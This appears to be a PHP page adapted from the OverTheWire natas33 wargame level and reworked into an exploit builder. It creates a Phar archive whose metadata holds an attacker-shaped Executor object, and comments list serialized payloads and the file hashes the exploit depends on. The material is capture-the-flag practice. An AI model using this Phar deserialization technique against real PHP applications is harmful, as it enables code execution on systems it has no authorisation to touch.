<html>

<head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
    <script>var wechallinfo = { "level": "natas33", "pass": "<censored>" };</script>
</head>
</head>

<body>
    <?php
    // graz XeR, the first to solve it! thanks for the feedback!
    // ~morla
    class Executor
    {
        private $filename = "upload1.php";
        private $signature = '74c5f6d942738df6a5683e4dae1e738d';
        private $init = False;
    }
    ?>

    <h1>natas33</h1>
    <div id="content">
        <h2>Can you get it right?</h2>

        <?php


        session_start();
        /*
        echo md5_file("upload.php");

        md5_file of UPLOAD.PHP:
        c70ddbf3566c467e8e5750d32950c732
        
        Serialized:
        O:8:"Executor":3:{s:18:"Executorfilename";s:17:"mylittleindex.php";s:19:"Executorsignature";s:32:"a298087bdc62c917696d22cd9649c0fc";s:14:"Executorinit";b:0;}
        O:8:"Executor":3:{s:18:"Executorfilename";s:17:"mylittleindex.php";s:19:"Executorsignature";s:32:"a298087bdc62c917696d22cd9649c0fc";s:14:"Executorinit";b:0;}
        O:8:"Executor":3:{s:18:"Executorfilename";s:9:"asdasdasd";s:19:"Executorsignature";s:32:"adeafbadbabec0dedabada55ba55d00d";s:14:"Executorinit";b:0;}
        */
        // create new Phar
        echo md5_file("upload1.php") . "<br>";

        $phar = new Phar('test.phar');
        $phar->startBuffering();
        $phar->addFromString('test.txt', 'text');
        $phar->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

        $test = new Executor();
        echo serialize($test) . '<br>';
        $phar->setMetadata($test);
        $phar->stopBuffering();

        echo "<br>--------------------------------------------<br>";
        echo md5_file('test.phar');
        echo "<br>--------------------------------------------<br>";

        exit;

        if (array_key_exists("filename", $_POST) and array_key_exists("uploadedfile", $_FILES)) {
            new Executor();
        }
        ?>
        <form enctype="multipart/form-data" action="index.php" method="POST">
            <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
            <input type="hidden" name="filename" value="<?php echo session_id(); ?>" />
            Upload Firmware Update:<br />
            <input name="uploadedfile" type="file" /><br />
            <input type="submit" value="Upload File" />
        </form>

        <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
    </div>
</body>

</html>